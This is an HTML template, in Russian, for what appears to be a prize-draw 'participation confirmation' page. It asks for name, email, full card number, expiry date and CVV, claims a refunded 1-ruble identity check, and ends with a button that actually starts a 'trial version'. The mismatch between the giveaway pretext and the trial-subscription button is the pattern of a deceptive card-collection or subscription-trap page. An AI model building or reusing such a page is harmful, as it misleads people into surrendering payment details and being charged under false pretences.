<div class="auth">
	<div class="container">
		<div class="register">
			<div class="register__wrapper">
				<h1 class="register__title">Подтверждение участия</h1>
				<div class="register__desc">Вам нужно ввести данные карты для того, чтобы мы подтвердили<br>
Вашу личность и закрепили за вами участие в розыгрыше. Будет списан 1 руб с Вашей карты и сразу возмещён обратно.</div>
				<form class="first-step">
					<div class="form-group">
						<div class="input">
							<input name="firstname" type="text" placeholder="Имя">
							<img src="{{ url('/icons/input-user.svg') }}">
						</div>
						<div class="input">
							<input name="lastname" type="text" placeholder="Фамилия">
							<img src="{{ url('/icons/input-user.svg') }}">
						</div>
					</div>
					<div class="input input_email">
						<input name="email" type="text" placeholder="Введите email">
						<img src="{{ url('/icons/input-mail.svg') }}">
						<span class="error__text"></span>
					</div>
					<button class="button main-button large-button button-continue" type="button">Продолжить</button>
				</form>
				<div class="card second-step" style="display:none;">
					<!-- CARD CONTAINER START -->
					<div class="card__wrapper"></div>
					<!-- CARD CONTAINER END --> 
					<div class="card__form">
						<form id="form" action="" class="">
								<div class="input input__wrapper input__wrapper_name">

										<input type="hidden" data-cp="name">
										<input type="text" id="name" name="name" placeholder="Имя" class="form__input input-name" required>

										<input type="hidden" data-cp="lastname">
										<input type="text" id="lastname" name="lastname" placeholder="Фамилия" class="form__input input-name" required>

										<img src="{{ url('/icons/input-user.svg') }}">
										<span class="error__text"></span>
								</div>
								<div class="input input__wrapper input__wrapper_cardNumber">
										<input type="hidden" data-cp="cardNumber">
										<input id="card-number" type="text" name="number" class="form__input" placeholder="Номер банковской карты">
										<img src="{{ url('/icons/input-card.svg') }}">
										<span class="error__text"></span>
								</div>
							<div class="form-group">
								<div class="input input__wrapper input__wrapper_expDateMonth input__wrapper_expDateYear">
										<input type="hidden" data-cp="expDateMonth">
										<input type="hidden" data-cp="expDateYear">
										<input id="card-expiry" type="text" name="expiry" class="form__input" placeholder="ММ/ГГ">
										<img src="{{ url('/icons/input-calendar.svg') }}">
										<span class="error__text"></span>
								</div>
								<div class="input input__wrapper input__wrapper_cvv">
										<input type="hidden" data-cp="cvv">
										<input id="card-cvc" type="text" name="cvc" class="form__input" placeholder="CVV">
										<img src="{{ url('/icons/input-cvv.svg') }}">
										<span class="error__text"></span>
								</div>
							</div>
						</form>
						<button type="button" class="button main-button large-button button-submit">Оформить пробную версию</button>

					</div>
				</div>
				<div class="auth__alt">Уже зарегистрированы? <a href="">Вход</a></div>
			</div>
		</div>
	</div>
</div>
